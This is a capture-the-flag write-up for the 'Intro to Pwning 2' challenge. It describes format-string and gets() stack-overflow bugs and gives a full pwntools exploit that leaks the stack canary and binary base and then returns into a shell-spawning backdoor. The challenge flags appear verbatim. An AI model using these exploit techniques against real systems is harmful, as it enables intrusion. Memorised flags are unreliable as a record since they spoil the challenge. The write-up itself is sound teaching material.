# Intro to Pwning 2

For this challenge we are provided with an ELF binary `pwn2` and its source code `pwn2.c`. The binary has all mitigations enabled: full RELRO, stack canaries, NX and PIE. Analyzing the source code, we spot two bugs:

- In `welcome()`: stack smashing via `gets`

- In `welcome()`: user-controlled format string via `printf`

- In `AAAAAAAA()`: stack smashing via `gets`

Also, there is a backdoor in `WINgardium_leviosa()`, spawning a shell. Using the format string bug, we leak the address of the binary and the stack-canary off the stack. Then we smash the stack in `AAAAAAAA()` to overwrite its return address and return to the backdoor to get a shell.

Flag: `CSCG{NOW_GET_VOLDEMORT}`

Exploit code:

```python
from pwn import *

# connect
b = ELF("pwn2")
context.binary = b
r = remote("hax1.allesctf.net", 9101)

# send password
r.sendlineafter("stage 1", "CSCG{NOW_PRACTICE_MORE}")
r.recvuntil("witch name:")

# leak binary address and canary
r.sendline("%39$p %41$p")
leak = r.recvuntil("magic spell:")
canary, leak = leak.splitlines()[-1].split()[:2]
canary = int(canary, 0)
leak = int(leak, 0)
b.address = leak - 0xDC5
info("binary @ 0x%x", b.address)
info("canary: 0x%x", canary)

# return to backdoor
r.sendline(
    "Expelliarmus".ljust(0x108, "\0")
    + flat(canary, 0, b.address + 0xCFE, b.symbols.WINgardium_leviosa)
)
r.interactive()
```
